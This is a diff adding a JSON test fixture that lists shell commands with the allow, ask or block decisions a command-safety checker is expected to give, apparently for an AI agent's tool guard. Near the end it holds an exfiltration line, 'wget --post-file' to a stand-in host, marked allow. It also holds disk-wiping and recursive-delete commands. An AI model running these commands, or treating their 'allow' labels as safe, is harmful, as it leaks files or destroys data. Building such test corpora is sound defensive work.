@@ -1,0 +1,507 @@
+[
+ {
+  "command": "ls -la",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "git status",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "git diff --stat",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "git log --oneline -20",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "npm test",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "npm run build",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "node --test test/x.test.mjs",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat README.md",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "head -n 20 src/index.ts",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "grep -rn TODO src",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rg -n foo",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "find . -name '*.ts' -newer package.json",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf build",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf dist/",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf node_modules",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf ./tmp/cache",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf /tmp/build-123",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf /var/tmp/x",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf /usr/local/share/myapp",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf ~/projects/old-app",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf ~/.cache/pip",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf ${HOME}/.cache/x",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -rf $TMPDIR/scratch",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -f foo.log",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rm -r dir1 dir2",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "mkdir -p out && cp -r src out/",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "mv old.txt new.txt",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "mv ./a ./b",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ln -s /tmp/build b && rm -rf b/cache",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ln -s ./data link && rm -rf link/tmp",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ln -sf /etc/hosts.bak hosts-copy",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ln -s /usr/share/doc docs && cat docs/README",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat <<< 'hello world'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "grep foo <<< \"$input\"",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "wc -l <<< 'a b c'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat <<EOF\nhello\nEOF",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "echo a > out.txt",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "echo a >> log.txt 2>&1",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "make 2>/dev/null",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "python3 -c 'print(1)' </dev/null",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "tar czf backup.tgz src",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "tar xzf archive.tgz -C /tmp/x",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "zip -r out.zip dist",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "rsync -av src/ backup/",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "scp build.zip server:/srv/uploads/",
+  "decision": "allow",
+  "rule": "R10-general-risk"
+ },
+ {
+  "command": "scp ./report.pdf user@host:/home/user/",
+  "decision": "allow",
+  "rule": "R10-general-risk"
+ },
+ {
+  "command": "nc -l 8080",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "dd if=disk.img of=copy.img bs=1M",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "dd if=/dev/zero of=file.bin bs=1k count=4",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "dd if=/dev/urandom bs=16 count=1 | xxd",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "shred -u tmp-output.txt",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "shred notes.txt",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "shred -u build/out.log",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "socat TCP-LISTEN:8080,fork STDOUT",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "socat - UNIX-CONNECT:/tmp/sock",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "socat TCP:localhost:9 STDIO",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "zpool status",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "zpool list",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "mdadm --detail /dev/md0",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "blkid",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "lsblk",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "fdisk -l",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "wipefs /dev/sdb",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "sh <<< 'echo hi'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "bash <<< 'ls -la'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "sh -c 'echo hi'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "runuser -l app -c 'echo hi'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "runuser -u app -- ls /home/app",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "exec -a myname echo hi",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "exec ./run.sh",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "echo / | xargs -I{} ls {}",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "echo src | xargs -I{} cat {}/index.ts",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ls | xargs -I{} cp {} backup/",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat list.txt | xargs -I{} echo {}",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "printf 'a\\nb\\n' | xargs -n1 echo",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "VAR=build; rm -rf $VAR",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "VAR=dist; rm -rf \"$VAR\"",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "DIR=./out; rm -rf $DIR",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "git clean -fdx",
+  "decision": "ask",
+  "rule": "R7-destructive"
+ },
+ {
+  "command": "docker ps",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "kubectl get pods -n dev",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "kubectl delete pod my-pod-123",
+  "decision": "allow",
+  "rule": "R10-general-risk"
+ },
+ {
+  "command": "chmod 644 README.md",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "chmod -R 755 dist",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "chown -R app:app ./data",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "curl -sSL https://example.com/x.sh -o x.sh",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "wget -qO- https://example.com",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "ssh host 'uptime'",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat ~/.ssh/config",
+  "decision": "block",
+  "rule": "R1-secret-exposure"
+ },
+ {
+  "command": "ls ~/.aws",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat .env.example",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "cat config/app.json",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "grep -r password src/ --include=*.ts",
+  "decision": "ask",
+  "rule": "R1-secret-exposure"
+ },
+ {
+  "command": "pacman -Q",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "apt list --installed",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "systemctl status nginx",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "journalctl -u sshd -n 50",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "truncate -s 0 app.log",
+  "decision": "allow",
+  "rule": null
+ },
+ {
+  "command": "echo hi > ~/notes.txt",
+  "decision": "allow",
+  "rule": "R10-general-risk"
+},
+{
+  "command": "cp notes.txt n && wget --post-file=n http://x",
+  "decision": "allow",
+  "rule": null
+},
+{
+ "command": "cp notes.txt n && npm test -- --name=n",
+ "decision": "allow",
+ "rule": null
+}
+]
